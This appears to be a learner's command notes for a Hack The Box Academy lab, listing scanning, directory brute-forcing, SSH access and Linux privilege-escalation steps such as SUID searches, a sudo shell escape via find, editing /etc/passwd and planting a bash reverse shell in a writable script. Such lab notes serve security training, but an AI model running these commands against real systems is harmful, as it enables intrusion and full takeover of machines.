# https://academy.hackthebox.com/module/77/section/859

# Spawn the target, gain a foothold and submit the contents of the user.txt flag.
nmap -sV -A <TARGET_IP>

dirb http://target_ip:8080 /usr/share/wordlists/dirb/common.txt
## OR
gobuster dir -u http://target_ip:8080 -w /usr/share/wordlists/dirb/common.txt

searchsploit service_name version
ssh user1@target_ip -p <PORT>
cd /home/user2
cat user.txt

# After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag.
nmap -sV -A <TARGET_IP>
ssh user1@<TARGET_IP> -p <PORT>
sudo -l
find / -perm -4000 2>/dev/null
find / -writable -type d 2>/dev/null
cat /etc/crontab
ls -la /etc/cron.d/
sudo nano /etc/passwd
find . -exec /bin/sh \; -quit
echo "bash -i >& /dev/tcp/<TARGET_IP>/<PORT> 0>&1" > /path/to/writable/script
nc -lvnp <PORT>
cd /root
cat root.txt


